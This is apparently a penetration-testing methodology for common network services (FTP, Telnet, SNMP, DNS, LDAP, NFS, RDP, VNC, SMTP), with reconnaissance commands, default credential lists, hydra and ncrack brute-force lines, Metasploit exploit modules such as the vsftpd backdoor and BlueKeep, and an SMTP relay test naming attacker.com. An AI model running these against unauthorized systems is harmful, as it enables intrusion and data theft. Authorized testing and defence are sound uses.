# Network Services Penetration Testing Methodology

## Overview
This methodology covers common network services: FTP, Telnet, SNMP, DNS, LDAP, NFS, RDP, VNC, and others.

---

## FTP (Port 21)

### Reconnaissance
```bash
# Nmap scripts
nmap -sV -sC -p21 --script=ftp-* {target}

# Banner grab
nc {target} 21
```

### Authentication Testing

#### Anonymous Access
```bash
ftp {target}
# Username: anonymous
# Password: (anything or email@example.com)
```

#### Default Credentials
- anonymous:(empty or email)
- ftp:ftp
- admin:admin
- user:user

#### Brute Force
```bash
hydra -L users.txt -P passwords.txt ftp://{target}
medusa -h {target} -U users.txt -P passwords.txt -M ftp
```

### Exploitation

#### vsftpd 2.3.4 Backdoor
```bash
# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target}
exploit
```

#### ProFTPD Backdoor
```bash
use exploit/unix/ftp/proftpd_133c_backdoor
```

### Post-Access
```bash
# List files
ls -la

# Download all files
wget -r ftp://anonymous:@{target}/

# Check for writable directories
put test.txt
```

### Metasploit Modules
```bash
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/anonymous
```

---

## Telnet (Port 23)

### Reconnaissance
```bash
nmap -sV -sC -p23 --script=telnet-* {target}
```

### Authentication Testing
```bash
# Connect
telnet {target}

# Brute force
hydra -L users.txt -P passwords.txt telnet://{target}
```

### Default Credentials
- admin:admin
- root:root
- user:user
- (varies by device manufacturer)

### Metasploit Modules
```bash
use auxiliary/scanner/telnet/telnet_version
use auxiliary/scanner/telnet/telnet_login
```

---

## SNMP (Port 161/162 UDP)

### Reconnaissance
```bash
# Nmap UDP scan
nmap -sU -sV -p161 --script=snmp-* {target}

# onesixtyone
onesixtyone -c community.txt {target}
```

### Community String Brute Force
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target}
```

### Common Community Strings
- public
- private
- manager
- cisco
- community

### Information Gathering
```bash
# SNMPwalk (v1/v2c)
snmpwalk -v2c -c public {target}

# Full system info
snmpwalk -v2c -c public {target} system

# Network interfaces
snmpwalk -v2c -c public {target} interfaces

# Running processes
snmpwalk -v2c -c public {target} hrSWRunName

# Installed software
snmpwalk -v2c -c public {target} hrSWInstalledName

# Users (Windows)
snmpwalk -v2c -c public {target} 1.3.6.1.4.1.77.1.2.25

# snmp-check (comprehensive)
snmp-check {target}
```

### Metasploit Modules
```bash
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_login
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_enumshares
```

---

## DNS (Port 53)

### Reconnaissance
```bash
nmap -sV -sC -p53 --script=dns-* {target}
nmap -sU -sV -p53 --script=dns-* {target}
```

### Zone Transfer
```bash
# dig
dig @{target} {domain} AXFR

# host
host -l {domain} {target}

# dnsrecon
dnsrecon -d {domain} -n {target} -t axfr
```

### Subdomain Enumeration
```bash
# dnsrecon brute force
dnsrecon -d {domain} -n {target} -t brt -D subdomains.txt

# dnsenum
dnsenum --dnsserver {target} {domain}

# fierce
fierce --domain {domain} --dns-servers {target}
```

### Cache Snooping
```bash
# Check if DNS resolves non-recursive queries (cache snooping)
dig @{target} www.google.com +norecurse
```

### Metasploit Modules
```bash
use auxiliary/gather/dns_bruteforce
use auxiliary/gather/dns_info
use auxiliary/scanner/dns/dns_amp
```

---

## LDAP (Port 389/636)

### Reconnaissance
```bash
nmap -sV -sC -p389,636 --script=ldap-* {target}
```

### Anonymous Bind
```bash
# Check for anonymous access
ldapsearch -x -H ldap://{target} -b "dc=example,dc=com"
```

### Information Gathering
```bash
# Base DN discovery
ldapsearch -x -H ldap://{target} -s base namingcontexts

# User enumeration
ldapsearch -x -H ldap://{target} -b "dc=example,dc=com" "(objectClass=user)"

# Full dump
ldapsearch -x -H ldap://{target} -b "dc=example,dc=com" "*"
```

### Domain Dump
```bash
# ldapdomaindump (with credentials)
ldapdomaindump -u 'domain\user' -p 'password' {target}
```

### Metasploit Modules
```bash
use auxiliary/gather/ldap_query
use auxiliary/scanner/ldap/ldap_search
```

---

## NFS (Port 2049/111)

### Reconnaissance
```bash
nmap -sV -sC -p111,2049 --script=nfs-* {target}
```

### Export Enumeration
```bash
# showmount
showmount -e {target}

# rpcinfo
rpcinfo -p {target}
```

### Mounting Shares
```bash
# Create mount point
mkdir /mnt/nfs

# Mount
mount -t nfs {target}:/share /mnt/nfs
mount -t nfs -o vers=2 {target}:/share /mnt/nfs

# Explore
ls -la /mnt/nfs
```

### Common Vulnerabilities
- World-readable exports
- no_root_squash (root on client = root on server)
- Writable shares

### Metasploit Modules
```bash
use auxiliary/scanner/nfs/nfsmount
```

---

## RDP (Port 3389)

### Reconnaissance
```bash
nmap -sV -sC -p3389 --script=rdp-* {target}
```

### Authentication Testing
```bash
# Connection test
xfreerdp /v:{target} /u:administrator

# rdesktop
rdesktop {target}
```

### Brute Force
```bash
# Hydra
hydra -L users.txt -P passwords.txt rdp://{target}

# Crowbar
crowbar -b rdp -s {target}/32 -u admin -C passwords.txt

# Ncrack
ncrack -vv --user administrator -P passwords.txt rdp://{target}
```

### Vulnerability Checking

#### BlueKeep (CVE-2019-0708)
```bash
# Nmap
nmap -p3389 --script rdp-vuln-ms12-020 {target}

# Metasploit
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS {target}
run
```

### Metasploit Modules
```bash
use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

---

## VNC (Port 5900+)

### Reconnaissance
```bash
nmap -sV -sC -p5900-5910 --script=vnc-* {target}
```

### Authentication Testing
```bash
# vncviewer
vncviewer {target}:5900

# Brute force
hydra -P passwords.txt vnc://{target}
```

### No Authentication
```bash
# Check for VNC without authentication
nmap -p5900 --script vnc-info {target}
```

### Metasploit Modules
```bash
use auxiliary/scanner/vnc/vnc_none_auth
use auxiliary/scanner/vnc/vnc_login
```

---

## SMTP (Port 25/465/587)

### Reconnaissance
```bash
nmap -sV -sC -p25,465,587 --script=smtp-* {target}
```

### User Enumeration
```bash
# VRFY command
smtp-user-enum -M VRFY -U users.txt -t {target}

# RCPT TO command
smtp-user-enum -M RCPT -U users.txt -t {target}

# EXPN command
smtp-user-enum -M EXPN -U users.txt -t {target}
```

### Open Relay Check
```bash
# Manual test
telnet {target} 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external.com>

# Nmap
nmap -p25 --script smtp-open-relay {target}
```

### Metasploit Modules
```bash
use auxiliary/scanner/smtp/smtp_version
use auxiliary/scanner/smtp/smtp_enum
use auxiliary/scanner/smtp/smtp_relay
```

---

## General Testing Checklist

- [ ] Service version identified
- [ ] Default credentials tested
- [ ] Anonymous/null access tested
- [ ] Brute force attempted (if appropriate)
- [ ] Known vulnerabilities checked
- [ ] Configuration weaknesses identified
- [ ] Sensitive information extracted
- [ ] Exploitation paths documented
